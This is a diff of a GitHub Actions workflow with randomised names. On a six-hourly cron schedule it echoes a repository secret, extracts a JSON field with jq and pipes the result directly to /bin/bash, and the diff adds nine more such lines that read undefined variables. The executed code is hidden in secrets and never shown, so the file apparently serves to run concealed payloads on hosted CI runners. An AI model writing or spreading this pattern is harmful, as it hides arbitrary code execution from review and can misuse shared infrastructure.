@@ -1,19 +1,26 @@
 name: huhuangzhang6574
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 3/6 * * *'
+    - cron: '39 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: huhuangzhang6574
         env:
-          otftz02165: ${{ secrets.otftz02165 }}
+          brqm4884: ${{ secrets.brqm4884 }}
         run: |
-          echo $otftz02165 | jq -r .by91 | /bin/bash
-          echo $ekh1 | jq -r .bj24079 | /bin/bash
+          echo $brqm4884 | jq -r .owyx25308 | /bin/bash
+          echo $afqot29 | jq -r .go4657 | /bin/bash
+          echo $sgo6850 | jq -r .f11 | /bin/bash
+          echo $k3177 | jq -r .df0 | /bin/bash
+          echo $gqys63 | jq -r .wtsdp9256 | /bin/bash
+          echo $yrqz10 | jq -r .fmh35090 | /bin/bash
+          echo $wdi16 | jq -r .wmu3948 | /bin/bash
+          echo $fkegu0409 | jq -r .jiwz4 | /bin/bash
+          echo $t0949 | jq -r .fhj43 | /bin/bash
+          echo $qreqh6964 | jq -r .c554 | /bin/bash
 
